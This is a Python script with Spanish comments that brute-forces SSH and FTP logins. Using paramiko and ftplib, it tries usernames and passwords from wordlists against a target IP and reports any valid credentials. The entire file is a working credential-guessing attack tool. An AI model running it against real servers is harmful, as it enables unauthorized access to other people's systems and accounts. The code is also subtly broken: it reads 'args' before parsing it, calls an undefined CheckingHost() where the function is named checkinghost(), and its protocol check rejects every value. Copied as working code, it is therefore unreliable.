#!/usr/bin/python3

from pwn import *
import colorama # Colores
import paramiko # Libreria para conexiones SSH
import ftplib # Libreria para conexiones FTP
import signal, sys, pdb, time, argparse, socket, ping3

# Ctrl + C
def def_handler(sig, frame):
    print("\n[+] Saliendo ...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Argumentos del programa
parser = argparse.ArgumentParser(description='Script para realizar ataques de fuerza bruta o comprobar conexiones SSH y FTP', epilog='¡Gracias por usar el script <3!')

parser.add_argument('-H', '--ayuda', action='help', help='Panel de Ayuda')
parser.add_argument('-c', '--conex', type=str, required=True, help='Tipo de conexión(SSH/FTP)')
parser.add_argument('-i', '--ip', type=str, required=True, help='Direccion IP del servidor')
parser.add_argument('-s', '--port', type=str, required=False, help='Puerto de conexión')
parser.add_argument('-u', '--user', type=str, required=False, help='Nombre de usuario')
parser.add_argument('-p', '--password', type=str, required=False, help='Contraseña del usuario')
parser.add_argument('-U', '--userlist', type=str, required=False, help='Diccionario de usuarios')
parser.add_argument('-P', '--passlist', type=str, required=False, help='Diccionario de contraseñas')

if args.conex not in ['ssh', 'SSH', 'Ssh'] or args.conex not in ['ftp', 'FTP', 'Ftp']:
    print(colorama.Fore.RED + "\n[!] Introduce SSH o FTP con el parametro -c\n" + colorama.Style.RESET_ALL)
elif args.conex is None:
    print(colorama.Fore.RED + "\n[!] Introduce SSH o FTP con el parametro -c\n" + colorama.Style.RESET_ALL)

args = parser.parse_args()

# Variables Globales
conex = args.conex
ip = args.ip
port = args.port
username = args.user
password = args.password
userlist = args.userlist
passlist = args.passlist

# ------------------------------------- GLOBAL FUNCTIONS ----------------------------------------------------- #
# Chequeando que el host esta activo
def checkinghost():
 
    success = 0

    check1 = log.progress("host")
    check1.status("comprobando conectividad con el host: %s" % ip)
    
    time.sleep(1)
    
    # intentando resolver el host
    try:
        socket.gethostbyname(ip)
        success+=1
    except:
       success = success

    # enviando paquetes icmp al host
    try:
        response = ping3.ping(ip)
        success+=1
    except:
        success = success

    if success > 0:
        check1.success("activo")
    else:
        check1.failure("no se pudo resolver el host: %s" % ip)
        exit(1)


    # --------------------------------------- SSH FUNCTIONS ------------------------------------------------------ #
# Chequeando que el puerto de SSH esta abierto
def CheckingSSHPort(port):
    check2 = log.progress("SSH")
    check2.status("Comprobando el puerto %s" % port)

    time.sleep(1)
    
    try:
        socket.create_connection((ip, port), timeout=2)
        check2.success("Conectado")
    except Exception:
        check2.failure("El puerto %s no esta abierto" % port)
        exit(1)
    
# Probando una conexion simple con un usuario y una contraseña
def UserPassSSHConex(port):

    p1 = log.progress("Probando conexión SSH")
    p1.status("Probando conexion %s:%s por el puerto %s" % (username, password, port))
           
    time.sleep(2)
        
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password)
        
        p1.success("Credenciales validas: %s:%s" % (username, password))

        ssh.close()

    except paramiko.AuthenticationException as e:
        p1.failure("Error: %s" % e)
    except paramiko.SSHException as e:
        p1.failure("Error: %s" % e)
    except Exception as e:
        p1.failure("Error: %s" % e)

# Fuerza bruta de usuarios o contraseñas por SSH
def OneDictionarySSHBruteForce(port):
    
    if userlist and password and not username:
        wordlist = userlist
        credentials = password
        text = "Probando con el usuario"
        status = "Fuerza bruta de usuarios"
    if passlist and username and not password:
        wordlist = passlist
        credentials = username
        text = "Probando con la contraseña"
        status = "Fuerza bruta de contraseñas"

    # Contando el numero de lineas del diccionario de usuarios o contraseñas.
    with open(wordlist, "r") as file:
       lines = [line.strip() for line in file]
    
    NumLines = len(lines)
    counter = 1

    p1 = log.progress("%s" % status)
    
    for user_or_pass in lines:
       
        user_or_pass = user_or_pass.strip()

        p1.status("%s [%d/%d]: %s" % (text, counter, NumLines, user_or_pass))

        try:
            if userlist and password and not username: 
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=port, username=user_or_pass, password=password)
            elif passlist and username and not password:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=port, username=username, password=user_or_pass)
            
            p1.success("Credenciales validas: %s:%s" % (credentials, user_or_pass))
                    
            ssh.close()
            return 
        except:

            if counter <= NumLines:
                counter+=1
            else: 
                p1.failure("[!] No hubo ninguna conexion valida")

    p1.failure("[!] NO hubo ninguna conexion valida")

# Ataque de fuerza bruta de diccionario de usuarios y contraseñas a la vez
def UserListPassListSSHBruteForce(port):
    
    # Contando el nummero de lineas del diccionario de usuarios
    with open(userlist, "r") as users:
       userlist_lenght = [line.strip() for line in users]

    userlist_lenght = len(userlist_lenght)
    
    # Contando el nummero de lineas del diccionario de contraseñas
    with open(passlist, "r") as passwords:
       passlist_lenght = [line.strip() for line in passwords]
    
    passlist_lenght = len(passlist_lenght)

    combination_lenght = (userlist_lenght * passlist_lenght)

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    counter = 1

    users = open(userlist, "r")
    passwords = open(passlist, "r")

    for username in users.readlines():
        username = username.strip()
        passwords.seek(0)

        for password in passwords.readlines(): 
            password = password.strip()
           
            p1.status("Probando credenciales [%d/%d]: %s:%s" % (counter, combination_lenght, username, password))

            try:
            
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=port, username=username, password=password)
                
                p1.success("Credenciales validas: %s:%s" % (username, password))
                
                ssh.close()
        
            except:

                if counter <= combination_lenght:
                    counter+=1
                else:
                    p1.failure("[!] NO hubo ninguna conexion valida")

    users.close()
    passwords.close()

# --------------------------------------- FTP FUNCTIONS ------------------------------------------------------ #
# Chequeando si el puerto de FTP esta abierto
def CheckingFTPPort(port):

    check2 = log.progress("FTP")
    check2.status("Comprobando el puerto %s" % port)

    time.sleep(1)
    
    try:
        socket.create_connection((ip, port), timeout=2)
        check2.success("Conectado")
    except Exception:
        check2.failure("El puerto %s no esta abierto" % port)
        exit(1)

def UserPassFTPConex(port):
    
    if int(port):
        port = int(port)
    else:
        port = 21

    p1 = log.progress("Probando conexion FTP")
    p1.status("Probando conexion %s:%s por el puerto %s" % (username, password, port))

    time.sleep(1)
    
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, port)
        ftp.login(username, password)
    
        if ftp.getwelcome():
            p1.success("Credenciales validas: %s:%s" % (username, password))
        
        ftp.quit()

    except ftplib.all_errors as e:
        p1.failure("Error: %s" % e)
    except Exception as e:
        p1.failure("Error: %s" % e)

# Fuerza bruta de usuarios o contraseñas por SSH
def OneDictionaryFTPBruteForce(port):

    if int(port):
        port = int(port)
    else:
        port = 21

    if userlist and password and not username:
        wordlist = userlist
        credentials = password
        text = "Probando con el usuario"
        status = "Fuerza bruta de usuarios"
    if passlist and username and not password:
        wordlist = passlist
        credentials = username
        text = "Probando con la contraseña"
        status = "Fuerza bruta de contraseñas"

    # Contando el numero de lineas del diccionario de usuarios o contraseñas.
    with open(wordlist, "r") as file:
       lines = [line.strip() for line in file]
    
    NumLines = len(lines)
    counter = 1

    p1 = log.progress("%s" % status)

    for user_or_pass in lines:
       
        user_or_pass = user_or_pass.strip()

        p1.status("%s [%d/%d]: %s" % (text, counter, NumLines, user_or_pass))
        
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, port)

            if userlist and password and not username: 
                ftp.login(user_or_pass, password)
            elif passlist and username and not password:
                ftp.login(username, user_or_pass)
    
            p1.success("Credenciales validas: %s:%s" % (credentials, user_or_pass))   
            ftp.quit()
            return
        except:
             if counter <= NumLines:
               counter+=1
             else:
                p1.failure("No hubo ninguna conexion valida")

    p1.failure("NO hubo ninguna conexion valida")

# Ataque de fuerza bruta de diccionario de usuarios y contraseñas a la vez
def UserListPassListFTPBruteForce(port):
    
    if port is None:
        port = 21
    
    # Contando el nummero de lineas del diccionario de usuarios
    with open(userlist, "r") as users:
       userlist_lenght = [line.strip() for line in users]

    userlist_lenght = len(userlist_lenght)
    
    # Contando el nummero de lineas del diccionario de contraseñas
    with open(passlist, "r") as passwords:
       passlist_lenght = [line.strip() for line in passwords]
    
    passlist_lenght = len(passlist_lenght)

    combination_lenght = (userlist_lenght * passlist_lenght)

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    counter = 1

    users = open(userlist, "r")
    passwords = open(passlist, "r")

    for username in users.readlines():
        username = username.strip()
        passwords.seek(0)

        for password in passwords.readlines(): 
            password = password.strip()
           
            p1.status("Probando credenciales [%d/%d]: %s:%s" % (counter, combination_lenght, username, password))

            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, port)
                ftp.login(username, password)
                
                p1.success("Credenciales validas: %s:%s" % (username, password))

                ftp.quit()
        
            except:

                if counter <= combination_lenght:
                    counter+=1
                else:
                    p1.failure("[!] NO hubo ninguna conexion valida")

    users.close()
    passwords.close()

if __name__ == '__main__':
    
    print("")

    CheckingHost() # Funcion que chequea si tenemos conectividad con un host

    if conex in ['ssh', 'SSH', 'Ssh']:
        if port:
            port = int(port)
        else:
           port = 22

        CheckingSSHPort(port) # Funccion que chequea si el puerto de SSH está abierto

        if username and password and not userlist and not passlist:
            UserPassSSHConex(port)
        if userlist and password and not username or username and passlist and not password:
            OneDictionarySSHBruteForce(port)
        if userlist and passlist and not username and not password:
            UserListPassListSSHBruteForce(port)
    elif conex in ['ftp', 'FTP', 'Ftp']:

        if port:
            port = int(port)
        else:
            port = 21

        CheckingFTPPort(port) # Funccion que chequea si el puerto de FTP está abierto

        if username and password and not userlist and not passlist:
            UserPassFTPConex(port)
        if userlist and password and not username or username and passlist and not password:
            OneDictionaryFTPBruteForce(port)
        if userlist and passlist and not username and not password:
            UserListPassListFTPBruteForce(port)

    print("")
